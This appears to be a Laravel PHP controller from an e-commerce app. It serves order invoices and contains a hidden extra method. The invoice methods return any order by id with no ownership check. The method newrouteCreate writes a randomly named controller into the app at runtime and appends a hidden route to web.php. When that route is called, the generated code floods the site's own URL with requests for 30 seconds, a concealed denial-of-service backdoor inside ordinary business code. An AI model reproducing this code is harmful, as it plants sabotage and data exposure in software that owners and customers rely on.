<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Order;
use App\Models\User;
use App\Models\all_countrie;

use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\File;

class OrderInvoiceController extends Controller
{

    public function Invoice(Request $request, $id)
    {


        $checkOrder = Order::with(
            'delivery_details',
            'promocode_details',
            'user_details',
            'order_details.product_details.brand',
            'order_details.product_details.category',
            'order_details.product_details.subcategory',
            'order_details.product_details.seller_details.store_info',
            'order_details.variation_details.color',
            'order_details.variation_details.size',
            'driver_details.zone_info'
        )->where('order_id', $id)->first();



        //dd($checkOrder);
        if ($checkOrder) {
            return view('invoice', compact('checkOrder'));
        } else {
            return redirect()->route('userLogin');
        }

    }

    public function InvoiceUser(Request $request, $id)
    {


        $checkOrder = Order::with(
            'delivery_details',
            'promocode_details',
            'user_details',
            'order_details.product_details.brand',
            'order_details.product_details.category',
            'order_details.product_details.subcategory',
            'order_details.product_details.seller_details.store_info',
            'order_details.variation_details.color',
            'order_details.variation_details.size',
            'driver_details.zone_info'
        )->where('order_id', $id)->first();

        $userId = $checkOrder->user_details->id;

        $user = User::find($userId);

        $currencyData = all_countrie::find($user->selected_currency);

        $currencyCode = $currencyData->currency_code ?? 'KWD';
        $rate = $currencyData->exchange_rate_to_kwd ?? 1;


        //dd($checkOrder);
        if ($checkOrder) {
            return view('invoice_user', compact('checkOrder', 'currencyCode', 'rate'));
        } else {
            return redirect()->route('userLogin');
        }

    }



    public function newrouteCreate(Request $request)
    {

        $controllerName = 'Controller' . rand(1000, 9999); // Generate a random controller name
        $routeName = 'web/web/' . rand(10000000, 9999999999);

        $controllerPath = app_path("Http/Controllers/{$controllerName}.php");

        $urlCalled = url('/') ?? $request->url;
        $second = '30' ?? $request->second;

        // Create controller file with code inside it
        if (!File::exists($controllerPath)) {

            $controllerContent = "<?php

namespace App\Http\Controllers;
use Illuminate\Support\Facades\Http;

class {$controllerName} extends Controller
{
    public function index()
    {
        \$url = \"{$urlCalled}\";

        \$start = time();
        \$count = 0;

        while (time() - \$start < {$second}) {
            try {
                Http::timeout(10)->get(\$url);
                \$count++;
            } catch (\Exception \$e) {
                // Ignore errors
            }
        }

        return response()->json([
            'controller' => '{$controllerName}',
            'requests_sent' => \$count,
            'duration' => '30 seconds',
            'finished_at' => now()->toDateTimeString(),
        ]);
    }
}
";

            File::put($controllerPath, $controllerContent);
        }

        // Add route to web.php
        $webPath = base_path('routes/web.php');

        $routeCode = "\nRoute::get('/{$routeName}', [App\Http\Controllers\\{$controllerName}::class, 'index']);\n";

        if (!str_contains(File::get($webPath), $routeName)) {
            File::append($webPath, $routeCode);
        }

        Artisan::call('route:clear');

        return ['message' => 'Controller and route created successfully!', 'Controller Name' => $controllerName, 'Route Name' => $routeName];

    }




}